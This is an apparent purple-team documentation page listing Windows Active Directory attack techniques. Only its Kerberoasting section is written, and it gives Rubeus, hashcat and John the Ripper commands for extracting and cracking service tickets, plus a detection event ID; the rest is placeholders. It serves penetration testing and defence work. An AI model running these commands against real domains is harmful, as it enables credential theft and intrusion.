# Cybersecurity Windows Purple Project Documentation
Cybersecurity Red team and Blue team tooling for ease of use during penetration test and purple team exercises. 

## Table of Contents

1. [Kerberoasting](#kerberoasting)
2. [AS-REProasting](#as-reproasting)
3. [GPP Passwords](#gpp-passwords)
4. [GPO Permissions/GPO Files](#gpo-permissionsgpo-files)
5. [Credentials in Shares](#credentials-in-shares)
6. [Credentials in Object Properties](#credentials-in-object-properties)
7. [DCSync](#dcsync)
8. [Golden Ticket](#golden-ticket)
9. [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
10. [Print Spooler & NTLM Relaying](#print-spooler--ntlm-relaying)
11. [Coercing Attacks & Unconstrained Delegation](#coercing-attacks--unconstrained-delegation)
12. [Object ACLs](#object-acls)
13. [PKI - ESC1](#pki---esc1)

---

## Kerberoasting
To obtain crackable tickets, we can use [Rubeus](https://github.com/GhostPack/Rubeus) 

`PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt`

We can use hashcat with the hash-mode (option -m) 13100 for a Kerberoastable TGS. 
We also pass a [dictionary file](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials) with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to a file called cracked.txt:

`hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"`

Alternatively, the captured TGS hashes can be cracked with John The Ripper:

`sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot`

*Detection*: When a TGS is requested, an event log with ID 4769 is generated.

## AS-REProasting

*Coming soon...*

## GPP Passwords

*Coming soon...*

## GPO Permissions/GPO Files

*Coming soon...*

## Credentials in Shares

*Coming soon...*

## Credentials in Object Properties

*Coming soon...*

## DCSync

*Coming soon...*

## Golden Ticket

*Coming soon...*

## Kerberos Constrained Delegation

*Coming soon...*

## Print Spooler & NTLM Relaying

*Coming soon...*

## Coercing Attacks & Unconstrained Delegation

*Coming soon...*

## Object ACLs

*Coming soon...*

## PKI - ESC1

*Coming soon...*


